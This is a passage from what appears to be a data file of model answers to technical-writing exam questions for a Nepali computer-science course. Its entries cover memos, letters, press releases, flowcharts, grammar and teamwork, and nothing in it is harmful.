applied.","how":"Headline, dateline, one-sentence lead with the five Ws, two quotes, then background. Cut the last paragraph first if time is short.","skel":["Headline with branch number and place","Dateline: city and date","Lead carrying the five Ws","Two attributed quotes","Background and forward plan"],"ans":"Universal IT Solution opens 25th branch in Pokhara\n\nPOKHARA, 12 Mangsir — Universal IT Solution Pvt. Ltd. opened its 25th branch in Pokhara on Monday, taking the company's retail and service network into all seven provinces.\n\nThe outlet at Lakeside Road offers laptop and accessory sales, authorised service for three brands, and a 20-seat training room for basic computer and digital-marketing courses. It employs 14 staff, 11 of them hired locally.\n\n“The branch is here because Pokhara is where our customers already are,” said Managing Director Ramesh Karki at the opening. “Our Kathmandu service centre was receiving 200 devices a month from Gandaki alone. Now those repairs take a day, not a week.”\n\nProvince assembly member Bina Gurung, who inaugurated the branch, said the training room mattered more than the showroom. “Digital skills are the bottleneck for small businesses in this province,” she said.\n\nThe company announced a 10 per cent student discount on repairs at the new branch until the end of Poush, and free digital-literacy classes every Saturday for school teachers.\n\nUniversal IT Solution, established in 2009, reported a turnover of NPR 1.2 billion last year and plans branches in Biratnagar and Nepalgunj by 2083."},"tw-54":{"u":3,"logic":"Checks that you can justify teamwork in writing with concrete advantages rather than slogans, and that you are honest enough to name the costs.","how":"Six advantages as bullets with a one-line reason each, then two lines of drawbacks and how to control them.","skel":["Expertise per section","Parallel work shortens schedule","Internal review before the audience","Buy-in and faster sign-off","Costs: coordination, voice, free-riding"],"ans":"Collaborative writing is producing a document by a team with defined roles rather than by one author.\n\nAdvantages:\n• Expertise — the security section is written by the security engineer and the budget by finance, so each part is accurate.\n• Speed — parallel drafting shortens a six-week manual to two and removes the single-person bottleneck.\n• Better quality — every draft has an internal reader before the real audience sees it.\n• Audience fit — a mixed team catches jargon that one specialist would leave in.\n• Buy-in — people who helped write a policy follow it, and sign-off is faster.\n• Continuity and training — the document survives one author leaving, and juniors learn house style beside seniors.\n\nCosts to acknowledge: coordination time, version conflicts, uneven contribution and a blended voice, controlled by one lead editor, shared templates and version control."},"tw-55":{"u":5,"logic":"Tests whether you can draw a standard flowchart — correct symbols, labelled decisions, one entry and one exit — for a process you invent yourself.","how":"Sketch the happy path first, then add three decision diamonds with Yes/No labels, then the login loop at the top.","skel":["Oval for start and end","Rectangle for each process","Diamond for each decision","Label both Yes and No branches","No crossing lines, one exit"],"ans":"A flowchart is a diagram of a process using standard symbols: oval = start or end, rectangle = process, diamond = decision, parallelogram = input or output, arrow = direction of flow.\n\nFlowchart — “Khaja”, my dream campus canteen app\n\n            ( Start )\n                |\n        [ Show today's menu ]\n                |\n        < Logged in? > --No--> [ Enter campus ID ] --> < Valid? > --No--> [ Show error ] --> ( End )\n                | Yes                                            | Yes\n        [ Select items and quantity ]\n                |\n        < Item in stock? > --No--> [ Suggest an alternative ] --> back to menu\n                | Yes\n        [ Add to cart ] --> [ Choose pickup time ] --> [ Pay by eSewa, Khalti or cash ]\n                |\n        < Payment successful? > --No--> [ Retry or cancel ] --> ( End )\n                | Yes\n        [ Generate token number, send SMS ]\n                |\n        [ Kitchen screen shows: Preparing ] --> [ Staff marks Ready ]\n                |\n        [ SMS: collect at counter ] --> ( End )\n\nDraw it top to bottom on one page, one decision per diamond, both branches labelled — unlabelled branches lose marks."},"tw-56":{"u":4,"logic":"A memo is the most format-sensitive internal document: header block, no salutation, purpose first, an action for each reader, and contact at the end.","how":"TO/FROM/DATE/SUBJECT, purpose in line one, one labelled paragraph per department, then the briefing and sign-off.","skel":["TO, FROM, DATE, SUBJECT block","Purpose and launch date in line one","One action paragraph per department","Deadlines and budget code","Meeting date, contact, no salutation"],"ans":"MEMORANDUM\nTO: All staff, Sunrise Foods Pvt. Ltd.\nFROM: Anil Thapa, General Manager\nDATE: 28 Chaitra 2082\nSUBJECT: Launch of Sunrise Instant Dal on Nepali New Year — what each team must do\n\nOn 1 Baisakh we launch Sunrise Instant Dal in three flavours — mushroom, mixed vegetable and chicken — at NPR 45 for a 100 g pack. This is our biggest launch of the year and every department has a part in it.\n\nMarketing: finalise the pack shot and radio script by 10 Baisakh. The Facebook campaign goes live on 25 Chaitra with the teaser “Misri pani?”.\n\nSales: confirm 400 retail outlets in Kathmandu, Pokhara and Biratnagar by 20 Chaitra. Distributors receive free sampling stands with their first order.\n\nProduction: the first batch of 60,000 packs must reach the warehouse by 24 Chaitra. Quality to test and sign off each flavour before dispatch.\n\nFinance: release the NPR 8 lakh launch budget in two instalments; book all launch expenses under code 4410.\n\nEveryone: wear the launch badge from 28 Chaitra and use #SunriseInstantDal in any post about the product.\n\nI will hold a 30-minute briefing in the main hall on 30 Chaitra at 4 p.m. Team leads should come with their checklists. Please raise any blocker with me before that meeting, not after.\n\nAnil Thapa\nGeneral Manager · ext. 204"},"tw-57":{"u":9,"logic":"Two short notes from the presentation and ethics units. The question is truncated in the paper, so you must name your topics and define each before detailing.","how":"Two headed notes, each a definition plus four features and one example. State which topics you are answering.","skel":["Zoom presentation: definition","Test equipment, simpler slides, slower pace","Chat and polls for interaction","Ethical dilemma: conflicting obligations","Six steps from recognition to review"],"ans":"Taking the two standard topics for this question.\n\nZoom presentation — a presentation delivered live over the Zoom video-conferencing platform instead of in a room. Content planning is unchanged; delivery changes:\n• Test the link, microphone and screen-share twenty minutes early, and keep a PDF plus a phone dial-in as backup.\n• Keep slides simple — video compression blurs small type, so use the 6×6 rule and 24pt minimum.\n• Speak about 10 per cent slower, pause after each point, and look at the camera rather than the gallery.\n• Mute when not speaking, and use chat and polls so the audience does something every few minutes.\n• Record only with consent. The commonest fault is reading slides to a frozen face.\n\nEthical dilemma — a situation in which two or more moral obligations conflict and no option is fully right, so the choice must be reasoned rather than rule-followed. Example: a technical writer finds a safety flaw in a manual the week before launch; reporting it delays forty jobs, silence risks injury. Steps: recognise the dilemma, gather facts, list stakeholders and their interests, weigh options against the code of conduct, law and consequences, decide and act, then review the outcome. Dilemmas are hard because of deadline pressure, divided loyalty, ambiguity and fear of consequences."},"tw-58":{"u":3,"logic":"A grammar question inside a writing paper: it tests whether you can state the rule, explain why it matters, and apply it to the tricky cases with examples.","how":"One-line rule, then five bullets covering intervening phrases, and/or, collective nouns, each/every, news and units.","skel":["Verb matches subject in number and person","Ignore phrases between subject and verb","and takes plural, or/nor takes the nearer","Collective nouns singular as one body","each, everyone, news take singular verbs"],"ans":"Subject–verb agreement is the rule that a verb must match its subject in number and person: a singular subject takes a singular verb, a plural subject a plural verb. It matters because a mismatch signals carelessness, slows the reader, and in technical text can make an instruction ambiguous — “the switch and the router is offline” leaves the reader unsure what is down. Errors cluster where words sit between subject and verb.\n\n• Ignore intervening phrases: “The list of approved routers is on the intranet” — subject is list, not routers.\n• Compound subjects with and take a plural verb: “The server and the switch are offline.” But a single idea stays singular: “Rice and dal is our staple.”\n• Either/or and neither/nor agree with the nearer subject: “Neither the manager nor the technicians were informed.”\n• Collective nouns are singular when acting as one body: “The committee has approved the budget.”\n• Indefinite pronouns are singular: “Each of the students has a laptop”; “Everyone is expected to log out.”\n• Plural-form singulars: “The news is good”; units of measure take a singular verb — “Five kilometres is a long walk.”\n\nQuick test: find the subject, delete everything between it and the verb, then read the pair aloud."},"tw-59":{"u":5,"logic":"Tests whether you can build the data as well as the chart: a table of figures, a computed rate, and the right graph type for a five-year trend.","how":"Table first with appeared and passed, compute one pass rate to show the formula, then grouped bars plus a line for trend.","skel":["Table: year, appeared, passed per year-group","Show the pass-rate formula once","Grouped bar chart for comparison","Line graph for the trend","Title, axes, units, source"],"ans":"Imaginary data — B.Sc. CSIT, one campus, 2081–2085 (students appeared and passed).\n\nYear   1st yr app/pass   2nd yr app/pass   3rd yr app/pass\n2081     120 / 96          110 / 88          104 / 82\n2082     132 / 105         112 / 85          100 / 79\n2083     128 / 99          108 / 80           98 / 76\n2084     140 / 112         118 / 92          102 / 81\n2085     145 / 118         122 / 97          108 / 86\n\nPass rate = passed ÷ appeared × 100. For 2085: 118 ÷ 145 × 100 = 81.4 per cent (1st year), 97 ÷ 122 = 79.5 (2nd), 86 ÷ 108 = 79.6 (3rd). Failure rate = 100 − pass rate, so 18.6, 20.5 and 20.4 per cent.\n\nGraph 1 — grouped bar chart: years on the X axis, pass percentage on the Y axis from 0 to 100, three bars per year, one shade per year-group, with a legend and axis units.\n\nGraph 2 — line graph of the same rates: three lines, one per year-group, showing the trend. The lines sit flat at about 79–81 per cent; the second year dips in 2083 and recovers by 2085.\n\nTitle each figure, label both axes with units, start the Y axis at zero, and add the source line “Campus examination office, imaginary data”."},"tw-60":{"u":7,"logic":"A comparison article under a word limit: it tests technical description of three device classes inside a journalistic form, not a specification sheet.","how":"Headline, then one paragraph per device with its physical description and its trade-off, then a one-line conclusion on fit.","skel":["Headline and opening scene","Desktop: parts, power, repairability","Laptop: portable, costlier, fragile","Palmtop: access without capability","Conclusion: choose by place of work"],"ans":"One machine, three shapes: choosing the computer that fits\n\nWalk into any Nepali office and you will see three kinds of computer doing the same work in different bodies. The desktop is the oldest: a separate box, monitor and keyboard, mains power only, and a full-size processor with room to add memory, a second disk or a graphics card. It is the cheapest per unit of performance and the easiest to repair, because a failed part is replaced rather than the whole machine. Its cost is immobility — the work stays where the desk is.\n\nThe laptop folds that machine into one portable body with a battery, screen and trackpad. It does the same tasks on the move, for a bank officer at a branch or a student in a lecture hall, but pays for the freedom in price, in a smaller screen, and in repair: a broken hinge or a cup of tea can cost a third of the machine's price.\n\nThe palmtop, now a phone or tablet, is the smallest and most limited: touch input, no full keyboard, little storage, software built for short tasks such as mail, maps, payments and photographs. Unmatched for access, useless for a spreadsheet.\n\nIn brief, the choice is not about power but about place — a desktop for a fixed desk and heavy work, a laptop for work that travels, a palmtop for work that fits in a pocket. Most offices now use all three."},"tw-61":{"u":7,"logic":"Instruction writing: numbered imperative steps, one action each, in the order the user performs them, split into clearly labelled parts.","how":"Three headed parts, numbered imperative steps, exact menu paths and keys. No explanation inside a step.","skel":["Part A: copy photos into a folder","Name the exact menu path","Part B: insert with caption numbering","Part C: Photoshop crop, adjust, export","One action per numbered step"],"ans":"Part A — Copying photos from a camera or phone into a folder (Windows 11)\n1. Connect the device by USB cable; on the phone, choose “File transfer”, not “Charging”.\n2. Press Win + E to open File Explorer and click the device under “This PC”.\n3. Open DCIM, then Camera. Select photos with Ctrl + click.\n4. Open D:\\Seminar, right-click, choose New → Folder, and name it Field-Survey.\n5. Press Ctrl + C on the photos, open the folder, press Ctrl + V, and wait for the progress bar to finish.\n6. Check that the count matches, then rename the best images meaningfully: fig1-bridge-crack.jpg.\n7. Copy the folder to a second drive or Google Drive as backup, then eject the device safely.\n\nPart B — Using the photos in the seminar report\n8. Place each photo directly under the paragraph that refers to it, never before it.\n9. In Word: Insert → Pictures → This Device, choose the file, then set Wrap Text → In Line with Text so pagination stays stable.\n10. Right-click → Insert Caption → Figure, and number figures in order, for example Figure 3.2.\n11. Refer to every figure in the text — “as Figure 3.2 shows” — or delete it. Crop and resize before inserting, and keep each file under 300 KB.\n\nPart C — Basic Photoshop editing\n12. File → Open, then Ctrl + J to duplicate the layer and edit the copy.\n13. Image → Adjustments → Levels or Brightness/Contrast to correct exposure.\n14. Crop tool (C) to remove distracting edges, keeping a 4:3 ratio for consistency.\n15. File → Export → Export As → JPEG, quality 80, sRGB, then place the exported file in the report."},"tw-62":{"u":8,"logic":"Tests the employment package: a tailored application letter plus a biodata sheet, with the post named, the evidence quantified and an enclosure line.","how":"Three short paragraphs — post, evidence, fit — then a labelled biodata block. Name the paper and date the advert appeared.","skel":["Sender, date, inside address","Post named in the subject line","Two achievements with numbers","Interview request and enclosure line","Biodata as a labelled block"],"ans":"New Road, Kathmandu\n12 Mangsir 2082\n\nThe Human Resources Manager\nHimalayan Tech Solutions Pvt. Ltd.\nLazimpat, Kathmandu\n\nSubject: Application for the post of Junior Software Developer\n\nDear Sir/Madam,\n\nI am writing to apply for the post of Junior Software Developer advertised in The Himalayan Times on 10 Mangsir 2082.\n\nI completed my B.Sc. CSIT at Tribhuvan University in 2081 with 74 per cent. In my final-year project I built a hostel-management system in Django and PostgreSQL, used by 180 students in my campus hostel, which reduced the warden's manual register to a single dashboard. During a six-month internship at Cloudy IT I wrote REST APIs in Node.js and closed 40 production bugs.\n\nYour company builds payment integrations, and my project work on eSewa sandbox integration is directly relevant. I work comfortably with Git, Agile stand-ups and code review.\n\nI enclose my CV and would welcome an interview at your convenience. I can be reached on 98XXXXXXXX.\n\nYours sincerely,\nSita Sharma\nEnclosures: CV, transcript, internship certificate\n\nBIODATA\nName: Sita Sharma · Date of birth: 12 March 2000 · Address: New Road, Kathmandu\nEducation: B.Sc. CSIT, TU, 2081 (74%); +2 Science, 2078 (72%)\nExperience: Intern, Cloudy IT (6 months); campus hostel management system (project)\nSkills: Python, Django, JavaScript, Node.js, PostgreSQL, Git\nLanguages: Nepali, English, Hindi · Hobbies: chess, trekking"},"tw-63":{"u":1,"logic":"A controlled-writing task: the marks are for using all eight connectors correctly and naturally inside two coherent paragraphs on one topic.","how":"Paragraph one: advantages with four connectors. Paragraph two: drawbacks, opened by however. Underline each one so it is counted.","skel":["Two paragraphs, one topic","Use all eight given expressions","On the one hand opens advantages","However turns to the drawbacks","In brief closes each paragraph"],"ans":"On the one hand, wireless convenience has quietly rewired daily life in Nepal. Wi-Fi in a café, Bluetooth in a pair of earbuds, a 4G phone in a pocket — such as these turn a bus park in Pokhara into an office. Moreover, Android has made a capable computer affordable at NPR 15,000, and for a shopkeeper in Butwal that is the first computer she has ever owned. In brief, the technology earns its place because it removes the wire, and with the wire it removes the reason to stay at a desk.\n\nHowever, convenience has a price, and the price is usually paid in security and coverage. Bluetooth, for example, can be hijacked to pair with a stranger's device in a crowded hall; public Wi-Fi, that is an open network with no password, exposes passwords on any laptop that joins it. EDGE, moreover, still covers hills where 4G does not reach, whereas fibre reaches only the towns — so the digital divide widens even as the devices get cheaper. The devices are, in brief, only as good as the network and the habits behind them."},"tw-64":{"u":4,"logic":"A full external business letter with a commercial ask: it tests letter format plus the trade content — specification, payment terms and the risks both sides must settle.","how":"Letterhead, Chinese inside address, subject, then three blocks: enquiry, payment terms, possible problems. End with a dated request.","skel":["Full block, Chinese inside address","Introduce the shop and the enquiry","Itemised quantities and specifications","LC at sight, 30 per cent advance","Problems: quality, delay, damage, duty"],"ans":"New Road, Kathmandu, Nepal\n12 Mangsir 2082\n\nThe Export Manager\nShenzhen Hongda Computer Co. Ltd.\nBlock C, Huaqiangbei, Futian District, Shenzhen 518031\nPeople's Republic of China\n\nSubject: Enquiry for regular monthly supply of assembled computers and spare parts\n\nDear Sir/Madam,\n\nWe are Sunrise Computers, a retail and wholesale computer shop at New Road, Kathmandu, trading since 2065 with an annual turnover of about NPR 4 crore. We supply schools, banks and small offices across Bagmati Province.\n\nWe wish to place a trial order and, if quality and delivery are satisfactory, to establish a monthly arrangement:\n• 40 assembled desktops — i5-12400, 16 GB RAM, 512 GB NVMe, 24-inch monitor\n• 25 business laptops — i5, 16 GB, 512 GB\n• Spare parts — 100 SSDs, 50 power supplies, 200 keyboards, 50 motherboards\n\nPlease quote your best FOB Shenzhen price, minimum order quantity, packing details and warranty terms for each item, and send a catalogue and company profile.\n\nPayment. We propose an irrevocable letter of credit at sight, opened through Nabil Bank, Kathmandu, in your favour. For the first trial order we can accept 30 per cent advance by telegraphic transfer and the balance against a copy of the bill of lading.\n\nPossible problems to settle in the contract:\n• Quality — we will inspect a sample before shipment; please state your defect-replacement policy.\n• Delay — goods must reach Kolkata within 30 days; state the penalty for late delivery.\n• Damage in transit — the route is Kolkata to Birgunj by rail and road; confirm seaworthy packing and insurance cover.\n• Duty and currency — Nepali import duty and exchange-rate movement affect our retail price; a 60-day price validity helps both sides.\n• Continuity — spare parts for old models must remain available for three years.\n\nWe look forward to your quotation by 30 Mangsir and to a long business relationship.\n\nYours sincerely,\nRamesh Karki\nProprietor, Sunrise Computers\nNew Road, Kathmandu · +977-1-4XXXXXX · sunrisecomputers@gmail.com"},"tw-65":{"u":2,"logic":"Tests whether you can shift register: this is a newspaper article, not an essay. The marks sit on a stated aim and audience and on headings that carry a scanning reader.","how":"Write the aim and audience in two lines before anything else, then four subheadings. Keep paragraphs to two lines.","skel":["Title, aim and audience in three lines","Four subheadings: change, gains, costs, next","One Nepali example under each","Forward-looking closing line"],"ans":"Headline: The Digital Classroom — How Computers Are Changing Higher Education in Nepal\nAim: to inform and mildly persuade. Audience: educated general readers of a national daily — parents, students, teachers — so plain words, short paragraphs, Nepali examples, no jargon.\n\nSubheading: From blackboard to browser\nKathmandu, 13 November. Admissions, results, notes and even lectures now arrive through a screen. A student in Dhangadhi watches a class recorded in Kirtipur the same evening.\nSubheading: What students gain\n• Self-paced study — recorded lectures, e-books, online quizzes.\n• Employable skills — spreadsheets, programming, data handling.\n• Wider access — scholarships and foreign courses without leaving home.\nSubheading: The other side\nLoad-shedding, weak rural internet, costly devices and phone distraction in class are real. Many teachers are untrained in digital tools.\nSubheading: What next\nCampus Wi-Fi, subsidised laptops and a first-semester digital-literacy course would help.\nThe computer will not replace the teacher; it decides whose lesson reaches the most students."},"tw-66":{"u":1,"logic":"Probes whether you can compare three platforms objectively and still control cohesion. The eight given connectors are marked individually, so each must appear naturally.","how":"Underline all eight expressions first, then give each platform one strength and one weakness. Tick each connector off as you use it.","skel":["One-line balanced verdict to open","Facebook, Twitter, Google+ — one strength each","Shared drawback section","All eight expressions used and ticked"],"ans":"Social media are now everyday workplace communication tools. In brief, they give reach and speed; the cost is distraction.\n\nFacebook: in general, it is the widest net — pages and groups reach parents, students and customers in one post. At first a college page looks informal, though it works well for announcements and event photographs. However, mixing personal and professional contacts blurs boundaries.\n\nTwitter: fast, public and text-first. It suits live updates and complaints, whereas Facebook suits longer posts and images. Even though a short limit forces brevity, it also invites misunderstanding.\n\nGoogle+: built for circles and long technical posts; it never reached a mass Nepali audience, so topic communities came with low reach.\n\nCommon drawbacks: rumour spreads faster than correction, tone is easily misread, and privacy settings change without notice. Finally, use social media to supplement email and formal documents, never to replace them."},"tw-67":{"u":5,"logic":"Tests whether you understand graphics as evidence rather than decoration, and whether you can match the right graphic to the right kind of data.","how":"Open with “graphics are evidence, not ornament”, then table, line, bar, pie and diagram — each with one named example from college life.","skel":["Claim: visuals carry data cheaper than prose","Five graphic types, one real example each","Why each one helps the reader","Rules: title, units, source, one message"],"ans":"Academic writing carries data, processes and relationships that prose describes badly. Graphics are not decoration; they are evidence in its cheapest, clearest form.\n\n• Tables — precise values in rows and columns, so a reader can compare and recalculate. Example: pass percentages of five colleges over three years; COCOMO effort estimates for three modules.\n• Line graphs — trends over continuous time. Example: monthly internet traffic on a campus network.\n• Bar charts — comparison across categories. Example: programming languages used by 200 surveyed developers.\n• Pie charts — parts of a whole. Example: share of the IT budget spent on hardware, software, training and support.\n• Diagrams and flowcharts — structure and process. Example: a data-flow diagram of a library system; the admission process as a flowchart.\n\nWhy they matter: they cut reading time, make comparison possible, expose outliers and let a supervisor grasp a finding in seconds. Rules: one message per graphic, numbered title, labelled axes with units, source cited, and a text reference (“see Figure 2”)."},"tw-68":{"u":1,"logic":"Pure grammar control. Most students can define the three types but lose marks on examples, so the nine examples are the marked part of the answer.","how":"Count clauses: one clause is simple, two joined is compound, one plus a dependent clause is complex. Take all examples from lab and college life.","skel":["Simple: one clause, three examples","Compound: two clauses, FANBOYS","Complex: independent plus dependent","Bonus: one compound-complex sentence"],"ans":"Sentences are classified by clause structure.\n\nSimple sentence — one independent clause with one subject–verb pair; it may still have a compound subject or object. It states one idea.\n1. The server crashed.\n2. Sabina and Bikash submitted the report yesterday.\n3. Our library closes at six in the evening.\n\nCompound sentence — two or more independent clauses joined by a coordinating conjunction (for, and, nor, but, or, yet, so), a semicolon or a conjunctive adverb.\n1. The power failed, but the generator started at once.\n2. I finished the code; my teammate wrote the documentation.\n3. The fee deadline is Friday, so pay online today.\n\nComplex sentence — one independent clause plus at least one dependent clause introduced by although, because, when, who, that and similar.\n1. Although the internet was slow, we uploaded the assignment on time.\n2. Students who submit late lose ten per cent.\n3. The system works better after the patch was installed.\n\nA compound–complex sentence combines both: “Although it rained, the lab stayed open, and the exam went ahead.”"},"tw-69":{"u":1,"logic":"Requires definition plus differentiation. Weak answers list features without saying what technical writing is not, so the comparison is where the second half of the marks sits.","how":"Define, then contrast with creative and academic writing in four rows, then list seven features — one line each.","skel":["Definition plus four real documents","Contrast: purpose, audience, tone, structure","Seven features that make it technical","Close on the success test: the reader acts"],"ans":"Technical communication is the exchange of specialised information — in writing, speech or visuals — so that a specific reader can understand it and act on it. Examples: a user manual, a bug report, a lab report, a project proposal, a safety notice.\n\nHow it differs (draw a small four-column comparison):\n• Purpose — inform, instruct or persuade towards action, not entertain or express feeling.\n• Audience — a defined, often non-expert reader; creative writing has no fixed reader.\n• Tone — objective and neutral; opinion must be evidence-backed.\n• Structure — headings, lists, numbered steps and diagrams so a reader can scan and re-read.\n• Success test — the reader completes the task correctly; in literature it is how the reader feels.\n\nFeatures that make communication technical: subject vocabulary defined on first use; accuracy with units and sources; logical organisation and signposting; visuals that carry data; plain style in active voice and second person; usability tested on real readers; and honesty about risk and uncertainty."},"tw-70":{"u":1,"logic":"Asks for skills and an acquisition route. Most answers list skills and stop, so the “how to acquire” half is where the marks actually sit.","how":"Pair each skill with one concrete practice — six pairs is the whole answer — then add the habits: reading, feedback, portfolio.","skel":["Six skills, one line each","Each paired with how to acquire it","Reading, feedback, portfolio habit","Close: practice beats talent"],"ans":"Technical writing skill is a set of learned habits, not a talent. Six matter most.\n\n1. Audience analysis — judge what the reader already knows. Acquire it by rewriting one document for three readers (expert, manager, new user) and comparing.\n2. Sentence craft — short sentences, active voice, one idea each. Acquire it by copyediting news reports and your own old assignments.\n3. Structure — outlines, headings, inverted pyramid. Acquire it by reverse-outlining a published manual before writing your own.\n4. Research and accuracy — verifying every figure. Acquire it by citing each number in one report and checking it twice.\n5. Visual literacy — tables, charts, labelled diagrams. Acquire it by redrawing a bad graph from a newspaper.\n6. Tool skill — Word styles, Google Docs, Markdown, a grammar checker. Acquire it by using them for real work.\n\nBuild all six with four habits: read good technical writing daily, keep a personal style sheet, write two hundred words a day, and get a senior to mark one page a week."},"tw-71":{"u":3,"logic":"Tests team process rather than team spirit. Examiners look for division of labour, one editor and version control — the four costs keep the answer balanced.","how":"Answer in three moves: why it is needed, five advantages, then the method. End on the costs so the answer reads as analysis.","skel":["Define collaborative writing","Why needed: expertise, time, review, buy-in","Five advantages in bullets","Method: outline, editor, style sheet, versions","Costs: coordination, voice, versions, free-riding"],"ans":"Collaborative writing means two or more people plan, draft, review and publish one document. It matters because no single writer holds all the expertise, time or authority a modern document needs.\n\nWhy it is important:\n• A user manual needs the developer's facts, the tester's experience, the lawyer's caution and the editor's language.\n• Peer review catches errors that self-editing misses.\n• Documents people helped write are accepted and used; buy-in is real.\n• Proposals and annual reports cannot be finished by one person before the deadline.\n\nAdvantages: wider expertise, speed through parallel work, better quality through review cycles, continuity when a member leaves, training for juniors and shared ownership.\n\nMethod: agree purpose and outline in one meeting → appoint a single editor for voice → divide by section with a shared style sheet and deadline → keep one file with version history and comments → review cycle → editor integrates → all sign off.\n\nCosts to manage: coordination time, inconsistent tone, version conflicts and members who do not contribute."},"tw-72":{"u":1,"logic":"Tests the 7 Cs and whether you know communication is judged by the response, not the effort. Answers that say only “use simple language” score half.","how":"Write the seven Cs as seven one-line bullets with one bad-to-good example, then add feedback and channel choice at the end.","skel":["Define by result, not by length","Seven Cs, one line each","One rewrite example: “soon” to a date","Add feedback and right channel"],"ans":"Effective communication is the transfer of a message that the receiver understands exactly as intended and can act on. It is measured by the response, not by the length of the message.\n\nPrinciples — the seven Cs plus two:\n• Clear — one idea per sentence and paragraph, plain words.\n• Concise — cut every word that adds nothing; a one-page memo beats three.\n• Concrete — facts, figures, names: “reply within 24 hours”, not “soon”.\n• Correct — grammar, spelling, units and facts checked.\n• Coherent — logical order, signposts, a topic sentence per paragraph.\n• Complete — who, what, when, where, why and what happens next.\n• Courteous — respectful tone; the reader is never blamed in public.\n• Audience-centred — vocabulary and depth matched to the reader's knowledge.\n• Channel-appropriate — bad news face to face, a decision by memo, a quick query by chat.\n\nAdd feedback: a message is not communication until it is confirmed. Example: “Fee deadline 25 November, 4 p.m., counter 2, bring your admit card” works; “pay the fee soon” does not."},"tw-73":{"u":9,"logic":"The stem is truncated but the argument is a career one: oral reporting is the visible half of professional competence. Marks go to structure and delivery, not praise for speaking.","how":"Concede that it decides careers, give four reasons, then a five-step method. Quote roughly 130 words a minute and end on an ask.","skel":["Define oral reporting with three examples","Four reasons it decides careers","Five steps: audience, structure, visuals, rehearsal, delivery","Close: every oral report carries an ask"],"ans":"Oral reporting is the spoken delivery of findings or progress — a briefing, a project update, a viva, a client pitch. In most organisations you are judged on it more than on your files, because it is the performance senior people actually see.\n\nWhy it decides your career:\n• Visibility — a clear ten-minute update makes your work known; silent good work stays invisible.\n• Public judgement — a muddled answer in a meeting is remembered longer than a good report.\n• Trust — managers promote people who can explain risk calmly to a client.\n\nHow to handle it:\n1. Analyse audience and purpose; write the core message in one sentence.\n2. Structure: hook and roadmap → three main points with evidence → summary and a specific request.\n3. One clear visual per point.\n4. Rehearse aloud and timed; anticipate five questions.\n5. Deliver with eye contact, about 130 words a minute, pauses, no reading.\n\nClose by stating what you need and by when; an oral report without an ask wastes the room."},"tw-74":{"u":3,"logic":"A reflective question marked on analysis: what went wrong in the group and what process you would change. A story with no lessons earns few marks.","how":"Tell one real project in four beats — plan, clash, fix, lesson — and name the tools: shared file, single editor, style sheet.","skel":["Name the project and the split of work","Two concrete problems that arose","How the group fixed them","Three process lessons for next time"],"ans":"Last semester four of us built a library-management system for our DBMS project. Dividing the work was easy; keeping it one document was not.\n\nWhat happened:\n• Planning — we met once, agreed the scope and a week-by-week schedule, and split by module: database, front end, reports, testing.\n• Drafting — everyone wrote in a different voice; one member wrote in note form, two used different heading styles.\n• Conflict — two versions of the same file were edited in parallel and a week of work was nearly lost. One member missed two internal deadlines and the rest absorbed his section.\n• Review — one integration meeting merged the sections and a single editor rewrote for consistent tone.\n\nWhat I learned: name a coordinator and one editor; use one shared file with version history, not email attachments; agree a style sheet on day one; set internal deadlines a week before submission; keep a short minutes note of decisions; and raise non-contribution early, not at the end.\n\nShared documents fail on process, not on talent."},"tw-75":{"u":6,"logic":"A web-writing task in disguise. An FAQ means question-shaped headings, front-loaded answers, second person and no marketing language.","how":"Write seven or eight questions a +2 graduate actually asks, answer the first line directly, and close with a contact and a deadline.","skel":["Title plus who the page is for","Seven questions in the asker's words","Answer in the first line, detail after","Contact and deadline line"],"ans":"FAQ: Admission to B.Sc. CSIT at Tribhuvan University\nFor +2 graduates and parents. Each answer begins with the direct reply.\n\nWho can apply? Anyone who has passed +2 Science or equivalent in second division with Mathematics. Check the current TU notice for the exact minimum.\n\nWhen does admission open? Usually after the entrance result, around Bhadra–Ashoj. Dates appear on the TU and campus websites.\n\nIs there an entrance exam? Yes. IOST sets a 100-mark objective paper in Physics, Chemistry, Mathematics, English and Computer. You must pass to be listed.\n\nHow do I apply? Fill the online form on the IOST portal, pay the fee at the bank, and print the admit card.\n\nHow is the merit list made? By entrance score, with reservation quotas under TU rules.\n\nWhat documents do I need? SEE and +2 marksheets, character and migration certificates, photographs, and a citizenship or birth certificate.\n\nHow much does it cost? Fees differ by campus; constituent campuses cost less than private ones.\n\nStill unsure? Contact the campus admission office before the deadline."},"tw-76":{"u":8,"logic":"A full block business letter marked on parts, not content. Date, inside address, salutation, close and signature carry marks that students routinely drop.","how":"Recall the nine letter parts, then fill three short paragraphs: post applied for, two quantified achievements, availability.","skel":["Sender, date, inside address, salutation","Para 1: post and where advertised","Para 2: two quantified achievements","Para 3: why them plus interview request","Close and signature block"],"ans":"Baneshwor, Kathmandu\n13 November 2026\n\nThe Human Resources Manager\nShikhar IT Solutions\nPutalisadak, Kathmandu\n\nDear Sir/Madam,\n\nSubject: Application for the post of part-time web developer\n\nI am writing to apply for the part-time web developer post advertised on your website on 10 November. I am a sixth-semester B.Sc. CSIT student at Tribhuvan University and can work twenty hours a week, including Saturdays.\n\nI have built three live projects: a college notice board in PHP and MySQL, a restaurant menu site in React, and a result scraper used by my department. In my last project I cut page load time from 4.2 to 1.8 seconds by compressing images and caching queries. I work comfortably with Git, responsive design and browser debugging.\n\nYour municipal e-governance portals interest me because they put code in front of citizens who need it, and I would like to contribute while finishing my degree.\n\nMy résumé is attached. I am free for an interview any afternoon after 2 p.m. and can start within a week.\n\nSincerely,\nArun Sharma\n98XXXXXXXX"},"tw-77":{"u":7,"logic":"Tests the news-release form: headline, dateline, a lead with the five Ws, a quote and boilerplate. Hype and first person are penalised.","how":"Write the lead sentence first with who, what, when, where and why. Everything else supports it. One page, third person.","skel":["FOR IMMEDIATE RELEASE plus media contact","Headline in sentence case","Dateline and five-W lead","One quote and one detail paragraph","About us boilerplate, then Ends"],"ans":"FOR IMMEDIATE RELEASE\nMedia contact: Arun Sharma, Public Relations Officer, 98XXXXXXXX, pr@xyzcollege.edu.np\n\nXYZ College Hosts Three-Day Education Fair for +2 Graduates\n\nKathmandu, 13 November 2026 — XYZ College, Baneshwor, will hold its annual Education Fair from 21 to 23 November 2026, 10 a.m. to 5 p.m., bringing forty universities, IT companies and training institutes onto one campus for students choosing a degree.\n\nThe fair targets +2 graduates and their parents, who must compare programmes, fees and career prospects within weeks of the results.\n\n“Most students choose a course from rumour, not information,” said Principal Dr. Ramesh Karki. “Here they meet the people who teach the course and the employers who hire from it.”\n\nHighlights include counselling on B.Sc. CSIT, BCA and engineering, a free aptitude test, and sessions on scholarships in Japan, Australia and Germany. Entry is free.\n\nAbout XYZ College: a Tribhuvan University 